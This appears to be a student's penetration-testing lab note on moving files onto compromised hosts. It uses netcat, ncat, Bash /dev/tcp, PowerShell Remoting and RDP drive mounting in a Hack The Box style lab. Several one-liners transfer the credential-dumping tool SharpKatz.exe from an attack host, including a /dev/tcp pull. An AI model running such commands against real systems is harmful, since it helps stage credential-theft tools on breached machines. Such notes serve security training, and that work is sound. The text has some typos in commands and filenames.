In this section we cover other methods like [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using `RDP` and `PowerShell` sessions.

### Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

#### NetCat - Compromised Machine Receiving Files

If data receive using `netcat` output will save in `.exe` file.
Here redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_\(stdin\)) using a single greater-than `>` followed by the filename. 
```shell-session
nc -l -p 8000 > SharpKatz.exe
```

`--recv-only` to close the connection once the file transfer is finished.
Receiving the files using `netcat`. 
```shell-session
ncat -l -p 8000 --recv-only > sharpkatz.exe
```

#### Netcat - Attack Host - Sending Files

`-q 0` will tell Netcat to close the connection once it finishes.
```shell-session
nc -q 0 ip prot < sharpkatz.exe
```

we can use `--send-only` rather than `-q`.  `--send-only` flag, when used in both connect and listen modes, prompts `Ncat` to terminate once its input is exhausted.

```
ncat --send-only 192.168.100.1 8000 < sharokatz.exe
```

#### Sending and Receiving File as Input to Netcat

Using `-q` option.
```shell-session
sudo nc -l -p 443 -q 0 < SharpKatz.exe

nc 192.168.49.128 443 > SharpKatz.exe
```

using `--send-only` option.
```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe

ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

#### Netcat Using /dev/tcp to Receive the File

- **Send a file** to a remote server
- **Receive a file** from a remote server but can't listen all time.
- **Exchange data bidirectionally** if you open it properly (e.g., with `exec`)

Sending files to `/dev/tcp` 
```shell-session
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Receive data from server and save to a file.
```
cat < /dev/tcp/192.168.100.1/443 > sharpkatx.exe
```

### PowerShell Session File Transfer
If `HTTP`, `HTTPS`, or `SMB` are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), `aka` `WinRM`, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using `PowerShell` sessions. Administrator use `powershell` to remotely manage the computers and we can use this to transfer files.

For this we need Administrative access, be a member of `Remote management Users` or have permission for `powershell remoting` in session configuration.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials.

#### Create a PowerShell Remoting Session to DATABASE01
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP


#### Mounting a Linux Folder Using rdesktop

```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/malware/files'
```

#### Mounting a Linux Folder Using xfreerdp
```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/malware/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the `RDP` session.

![[Pasted image 20251020021043.png]]



Same we can use Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
![[Pasted image 20251020021425.png]]

`Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.`

